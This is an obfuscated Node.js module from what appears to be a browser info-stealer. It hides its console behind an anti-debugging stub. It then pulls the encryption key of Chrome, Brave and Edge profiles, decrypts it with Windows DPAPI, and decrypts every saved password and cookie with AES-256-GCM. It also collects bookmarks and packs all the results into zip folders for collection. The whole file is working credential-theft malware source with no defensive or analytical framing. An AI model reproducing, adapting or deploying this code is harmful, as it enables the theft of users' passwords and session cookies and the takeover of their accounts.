const _0x3c85cc = (function () {
    let _0x1ef6b7 = true
    return function (_0x1fcb01, _0x3ed9c4) {
      const _0x3d1760 = _0x1ef6b7
        ? function () {
            if (_0x3ed9c4) {
              const _0x3c2820 = _0x3ed9c4.apply(_0x1fcb01, arguments)
              return (_0x3ed9c4 = null), _0x3c2820
            }
          }
        : function () {}
      return (_0x1ef6b7 = false), _0x3d1760
    }
  })(),
  _0x27166f = _0x3c85cc(this, function () {
    let _0x31f1c4
    try {
      const _0x2b1fed = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x31f1c4 = _0x2b1fed()
    } catch (_0x45af42) {
      _0x31f1c4 = window
    }
    const _0x431992 = (_0x31f1c4.console = _0x31f1c4.console || {})
    const _0x53571a = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x417147 = 0; _0x417147 < _0x53571a.length; _0x417147++) {
      const _0x42bc44 = _0x3c85cc.constructor.prototype.bind(_0x3c85cc),
        _0x582a54 = _0x53571a[_0x417147],
        _0x26dd09 = _0x431992[_0x582a54] || _0x42bc44
      _0x42bc44['__proto__'] = _0x3c85cc.bind(_0x3c85cc)
      _0x42bc44.toString = _0x26dd09.toString.bind(_0x26dd09)
      _0x431992[_0x582a54] = _0x42bc44
    }
  })
_0x27166f()
module.exports = (_0x48e9d4) => {
  return {
    savePasswords() {
      _0x48e9d4.utils.jszip.createFolder('\\Passwords')
      for (let [_0x403143, _0x32f8] of Object.entries(
        _0x48e9d4.config.environ.passwords
      )) {
        if (_0x32f8.length != 0) {
          _0x48e9d4.utils.jszip.createTxt(
            '\\Passwords\\' + _0x403143.toUpperCase() + '.txt',
            _0x32f8.join('\n\n')
          )
        }
      }
    },
    saveBookmarks() {
      _0x48e9d4.utils.jszip.createFolder('\\Bookmarks')
      for (let [_0x5a501c, _0x56d4a7] of Object.entries(
        _0x48e9d4.config.environ.bookmarks
      )) {
        _0x56d4a7.length != 0 &&
          _0x48e9d4.utils.jszip.createTxt(
            '\\Bookmarks\\' + _0x5a501c.toUpperCase() + '.txt',
            _0x56d4a7.join('\n\n')
          )
      }
    },
    saveCookies() {
      _0x48e9d4.utils.jszip.createFolder('\\Cookies')
      for (let [_0x3654ca, _0x5c79ac] of Object.entries(
        _0x48e9d4.config.environ.cookies
      )) {
        _0x5c79ac.length != 0 &&
          _0x48e9d4.utils.jszip.createTxt(
            '\\Cookies\\' + _0x3654ca.toUpperCase() + '.txt',
            JSON.stringify(_0x48e9d4.config.environ.cookies[_0x3654ca])
          )
      }
    },
    async getBrowserData(_0x4b7859) {
      let _0x351aef
      _0x4b7859.includes('Local')
        ? (_0x351aef = _0x4b7859.split('\\Local\\')[1].split('\\')[0])
        : (_0x351aef = _0x4b7859.split('\\Roaming\\')[1].split('\\')[1])
      if (_0x351aef == 'Google') {
        _0x351aef == 'Chrome'
      } else {
        if (_0x351aef == 'BraveSoftware') {
          _0x351aef = 'Brave'
        } else {
          _0x351aef == 'Microsoft' && (_0x351aef = 'Microsoft Edge')
        }
      }
      _0x48e9d4.utils.jszip.createFolder('\\Browsers')
      _0x48e9d4.utils.jszip.createFolder('\\Browsers\\' + _0x351aef)
      try {
        ;['Extension Cookies'].forEach((_0x11a489) => {
          try {
            _0x48e9d4.utils.jszip.createTxt(
              '\\Browsers\\' + _0x351aef + '\\' + _0x11a489,
              _0x48e9d4.requires.fs.readFileSync(_0x4b7859 + '\\' + _0x11a489)
            )
          } catch {}
        })
      } catch {}
    },
    async getBookmarks(_0x3a411e) {
      let _0x3c71c1
      _0x3a411e.includes('Local')
        ? (_0x3c71c1 = _0x3a411e.split('\\Local\\')[1].split('\\')[0])
        : (_0x3c71c1 = _0x3a411e.split('\\Roaming\\')[1].split('\\')[1])
      if (_0x3c71c1 == 'Google') {
        _0x3c71c1 == 'Chrome'
      } else {
        if (_0x3c71c1 == 'BraveSoftware') {
          _0x3c71c1 = 'Brave'
        } else {
          if (_0x3c71c1 == 'Microsoft') {
            _0x3c71c1 = 'Microsoft Edge'
          }
        }
      }
      if (_0x48e9d4.requires.fs.existsSync(_0x3a411e + '\\Bookmarks')) {
        var _0x42a533 = JSON.parse(
          _0x48e9d4.requires.fs.readFileSync(_0x3a411e + '\\Bookmarks')
        ).roots.bookmark_bar.children
        for (var _0x34831a of _0x42a533) {
          try {
            _0x48e9d4.config.environ.bookmarks.all.push(
              '==================================================\nBROWSER   : ' +
                _0x3c71c1 +
                '\nID        : ' +
                _0x34831a.id +
                '\nNAME      : ' +
                _0x34831a.name +
                '\nURL       : ' +
                _0x34831a.url +
                '\nGUID      : ' +
                _0x34831a.guid +
                '\nADDED AT  : ' +
                _0x34831a.date_added +
                '\n=================================================='
            )
            !_0x48e9d4.config.environ.bookmarks[_0x3c71c1] &&
              (_0x48e9d4.config.environ.bookmarks[_0x3c71c1] = [])
            _0x48e9d4.config.environ.bookmarks[_0x3c71c1].push(
              '==================================================\nBROWSER   : ' +
                _0x3c71c1 +
                '\nID        : ' +
                _0x34831a.id +
                '\nNAME      : ' +
                _0x34831a.name +
                '\nURL       : ' +
                _0x34831a.url +
                '\nGUID      : ' +
                _0x34831a.guid +
                '\nADDED AT  : ' +
                _0x34831a.date_added +
                '\n=================================================='
            )
          } catch (_0xe868ba) {}
          _0x48e9d4.config.counter.bookmarks++
        }
      }
    },
    async getCookies(_0x384824) {
      let _0x2b0f4c = _0x384824.split('\\'),
        _0x1591cb = _0x384824.includes('Network')
          ? _0x2b0f4c.splice(0, _0x2b0f4c.length - 3)
          : _0x2b0f4c.splice(0, _0x2b0f4c.length - 2),
        _0x2698e7 = _0x1591cb.join('\\') + '\\',
        _0x156bca
      _0x384824.includes('Local')
        ? (_0x156bca = _0x384824.split('\\Local\\')[1].split('\\')[0])
        : (_0x156bca = _0x384824.split('\\Roaming\\')[1].split('\\')[1])
      if (_0x156bca == 'Google') {
        _0x156bca == 'Chrome'
      } else {
        if (_0x156bca == 'BraveSoftware') {
          _0x156bca = 'Brave'
        } else {
          _0x156bca == 'Microsoft' && (_0x156bca = 'Microsoft Edge')
        }
      }
      if (
        _0x384824.startsWith(
          _0x48e9d4.utils.encryption.decryptData(_0x48e9d4.config.user.appdata)
        )
      ) {
        _0x2698e7 = _0x384824
      }
      if (_0x384824.includes('cord')) {
        return
      }
      if (_0x48e9d4.requires.fs.existsSync(_0x2698e7)) {
        let _0x4acc6c = Buffer.from(
          JSON.parse(
            _0x48e9d4.requires.fs.readFileSync(_0x2698e7 + 'Local State')
          ).os_crypt.encrypted_key,
          'base64'
        ).slice(5)
        if (!_0x48e9d4.requires.fs.existsSync(_0x384824 + 'Network')) {
          return
        } else {
        }
        var _0x57371e = _0x384824 + 'Network\\Cookies',
          _0x11384f = _0x384824 + 'Network\\cookies.db'
        _0x48e9d4.requires.fs.copyFileSync(_0x57371e, _0x11384f)
        const _0x2092f5 = _0x48e9d4.requires.dpapi.unprotectData(
          Buffer.from(_0x4acc6c, 'utf-8'),
          null,
          'CurrentUser'
        )
        var _0x4c28d4 = new _0x48e9d4.requires.sqlite3.Database(
          _0x57371e,
          (_0x25466a) => {}
        )
        await new Promise((_0x5186ba, _0x5b12e4) => {
          var _0x7d6cd1 = 0
          _0x4c28d4.each(
            'SELECT * FROM cookies',
            function (_0x50d693, _0x1d298a) {
              let _0x293f1f = _0x1d298a.encrypted_value
              var _0x14988c
              try {
                if (
                  _0x293f1f[0] == 1 &&
                  _0x293f1f[1] == 0 &&
                  _0x293f1f[2] == 0 &&
                  _0x293f1f[3] == 0
                ) {
                  _0x14988c = dpapi.unprotectData(
                    _0x293f1f,
                    null,
                    'CurrentUser'
                  )
                } else {
                  let _0x150164 = _0x293f1f.slice(3, 15),
                    _0x1a6e09 = _0x293f1f.slice(15, _0x293f1f.length - 16),
                    _0x5552f0 = _0x293f1f.slice(
                      _0x293f1f.length - 16,
                      _0x293f1f.length
                    ),
                    _0x280778 = _0x48e9d4.requires.crypto.createDecipheriv(
                      'aes-256-gcm',
                      _0x2092f5,
                      _0x150164
                    )
                  _0x280778.setAuthTag(_0x5552f0)
                  _0x14988c =
                    _0x280778.update(_0x1a6e09, 'base64', 'utf-8') +
                    _0x280778.final('utf-8')
                }
              } catch {}
              _0x7d6cd1++
              _0x48e9d4.config.environ.cookies.all.push({
                domain: _0x1d298a.host_key,
                expirationDate: _0x1d298a.expires_utc,
                hostOnly: false,
                httpOnly: _0x1d298a.is_httponly == 1 ? true : false,
                name: _0x1d298a.name,
                path: _0x1d298a.path,
                sameSite: {
                  '-1': 'unspecified',
                  0: 'no_restriction',
                  1: 'lax',
                }[_0x1d298a.samesite],
                secure: _0x1d298a.is_secure == 1 ? true : false,
                session: false,
                storeId: '0',
                value: _0x14988c,
                id: _0x7d6cd1,
              })
              !_0x48e9d4.config.environ.cookies[_0x156bca] &&
                (_0x48e9d4.config.environ.cookies[_0x156bca] = [])
              _0x48e9d4.config.environ.cookies[_0x156bca].push({
                domain: _0x1d298a.host_key,
                expirationDate: _0x1d298a.expires_utc,
                hostOnly: false,
                httpOnly: _0x1d298a.is_httponly == 1 ? true : false,
                name: _0x1d298a.name,
                path: _0x1d298a.path,
                sameSite: {
                  '-1': 'unspecified',
                  0: 'no_restriction',
                  1: 'lax',
                }[_0x1d298a.samesite],
                secure: _0x1d298a.is_secure == 1 ? true : false,
                session: false,
                storeId: '0',
                value: _0x14988c,
                id: _0x7d6cd1,
              })
              _0x48e9d4.config.counter.cookies++
            },
            function () {
              _0x5186ba('')
            }
          )
        })
      }
    },
    async getPasswords(_0x2858da) {
      let _0x883948 = _0x2858da.split('\\'),
        _0x37c41c = _0x2858da.includes('Network')
          ? _0x883948.splice(0, _0x883948.length - 3)
          : _0x883948.splice(0, _0x883948.length - 2),
        _0xe97a39 = _0x37c41c.join('\\') + '\\',
        _0x378641
      _0x2858da.includes('Local')
        ? (_0x378641 = _0x2858da.split('\\Local\\')[1].split('\\')[0])
        : (_0x378641 = _0x2858da.split('\\Roaming\\')[1].split('\\')[1])
      if (_0x378641 == 'Google') {
        _0x378641 == 'Chrome'
      } else {
        if (_0x378641 == 'BraveSoftware') {
          _0x378641 = 'Brave'
        } else {
          if (_0x378641 == 'Microsoft') {
            _0x378641 = 'Microsoft Edge'
          }
        }
      }
      if (
        _0x2858da.startsWith(
          _0x48e9d4.utils.encryption.decryptData(_0x48e9d4.config.user.appdata)
        )
      ) {
        _0xe97a39 = _0x2858da
      }
      if (_0x2858da.includes('cord')) {
        return
      }
      if (_0x48e9d4.requires.fs.existsSync(_0xe97a39)) {
        let _0x39597c = Buffer.from(
          JSON.parse(
            _0x48e9d4.requires.fs.readFileSync(_0xe97a39 + 'Local State')
          ).os_crypt.encrypted_key,
          'base64'
        ).slice(5)
        var _0x5d72cc = _0x2858da + 'Login Data',
          _0xb7c969 = _0x2858da + 'passwords.db'
        _0x48e9d4.requires.fs.copyFileSync(_0x5d72cc, _0xb7c969)
        const _0x421232 = _0x48e9d4.requires.dpapi.unprotectData(
          Buffer.from(_0x39597c, 'utf-8'),
          null,
          'CurrentUser'
        )
        var _0x57890a = new _0x48e9d4.requires.sqlite3.Database(
          _0xb7c969,
          (_0x1918f6) => {}
        )
        await new Promise((_0x54a12c, _0x238867) => {
          _0x57890a.each(
            'SELECT origin_url, username_value, password_value FROM logins',
            function (_0x3186de, _0x1a8e41) {
              if (_0x1a8e41.username_value != '') {
                let _0x8ffbbc = _0x1a8e41.password_value
                try {
                  var _0x54a55d
                  if (
                    _0x8ffbbc[0] == 1 &&
                    _0x8ffbbc[1] == 0 &&
                    _0x8ffbbc[2] == 0 &&
                    _0x8ffbbc[3] == 0
                  ) {
                    _0x54a55d = dpapi.unprotectData(
                      _0x8ffbbc,
                      null,
                      'CurrentUser'
                    )
                  } else {
                    let _0x1df4ad = _0x8ffbbc.slice(3, 15),
                      _0x386497 = _0x8ffbbc.slice(15, _0x8ffbbc.length - 16),
                      _0x566e6c = _0x8ffbbc.slice(
                        _0x8ffbbc.length - 16,
                        _0x8ffbbc.length
                      ),
                      _0x1848a6 = _0x48e9d4.requires.crypto.createDecipheriv(
                        'aes-256-gcm',
                        _0x421232,
                        _0x1df4ad
                      )
                    _0x1848a6.setAuthTag(_0x566e6c)
                    _0x54a55d =
                      _0x1848a6.update(_0x386497, 'base64', 'utf-8') +
                      _0x1848a6.final('utf-8')
                  }
                  _0x48e9d4.config.environ.passwords.all.push(
                    '==================================================\nURL          : ' +
                      _0x1a8e41.origin_url +
                      '\nWeb Browser  : ' +
                      _0x378641 +
                      '\nUser Name    : ' +
                      _0x1a8e41.username_value +
                      '\nPassword     : ' +
                      _0x54a55d +
                      '\nFilename     : ' +
                      _0x2858da +
                      '\n=================================================='
                  )
                  !_0x48e9d4.config.environ.passwords[_0x378641] &&
                    (_0x48e9d4.config.environ.passwords[_0x378641] = [])
                  _0x48e9d4.config.environ.passwords[_0x378641].push(
                    '==================================================\nURL          : ' +
                      _0x1a8e41.origin_url +
                      '\nWeb Browser  : ' +
                      _0x378641 +
                      '\nUser Name    : ' +
                      _0x1a8e41.username_value +
                      '\nPassword     : ' +
                      _0x54a55d +
                      '\nFilename     : ' +
                      _0x2858da +
                      '\n=================================================='
                  )
                  _0x48e9d4.config.counter.passwords++
                } catch {}
              }
            },
            function () {
              _0x54a12c('')
            }
          )
        })
      }
    },
  }
}
